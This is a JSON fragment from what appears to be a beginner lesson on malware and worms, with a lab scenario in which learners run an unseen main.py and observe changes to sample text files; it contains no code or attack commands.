    "encrypted": "false",
    "long_instructions": "### What Is Malware?\r\n\r\n**Malware** is software designed to harm, disrupt, or gain unauthorized access to a system.\r\n\r\nA **worm** is a specific type of malware that spreads automatically from one device to another without needing to attach to a file. Once activated, a worm can replicate itself, move across networks or folders, and damage or overwrite files.\r\n\r\n---\r\n\r\n#### Scenario\r\n\r\nYou are working on a shared project when you come across a Python file named `main.py`. It seems like an old coding assignment or maybe something another student made to organize files. \r\n\r\nYour job is to investigate what happens when this file runs and what it does to the system around it.\r\n\r\n<br/><br/>\r\n\r\n**Step 1: Look Around**\r\n\r\nOpen and read the following files:\r\n\r\n* `my_essay.txt`\r\n* `science_project.txt`\r\n* `grades.txt`\r\n\r\n<br/><br/>\r\n\r\n**Step 2: Run the `main.py`**\r\n\r\nClick on `main.py` and press **Run**.\r\n<br/><br/>\r\n\r\n**Step 3: Check the Damage**\r\n\r\nLook at for any changes in the `.txt` files and console.\r\n\r\n<br/><br/>",
